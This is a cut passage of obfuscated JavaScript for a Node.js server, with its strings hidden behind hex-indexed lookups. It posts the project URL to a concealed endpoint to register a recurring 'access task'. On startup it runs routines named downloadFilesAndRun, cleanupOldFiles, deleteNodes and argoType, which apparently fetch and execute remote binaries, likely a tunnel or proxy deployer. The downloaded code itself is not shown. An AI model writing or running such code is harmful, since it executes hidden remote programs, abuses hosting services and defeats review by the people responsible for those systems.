axios['post'](_0x4cbb1e(0x1dc),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4cbb1e(0x1a1)}});return console['log'](_0x4cbb1e(0x173)),_0x508dfa;}catch(_0x2b47a8){return console[_0x4cbb1e(0x1ca)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x2b47a8['message']),null;}}async function startserver(){const _0x221f53=_0x1ba60d;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x45c5ea){console['error'](_0x221f53(0x1c8),_0x45c5ea);}}startserver()[_0x1ba60d(0x181)](_0x3f04b7=>{const _0x257fd7=_0x1ba60d;console['error'](_0x257fd7(0x1d6),_0x3f04b7);}),app['listen'](PORT,()=>console[_0x1ba60d(0x1c7)](_0x1ba60d(0x179)+PORT+'!'));
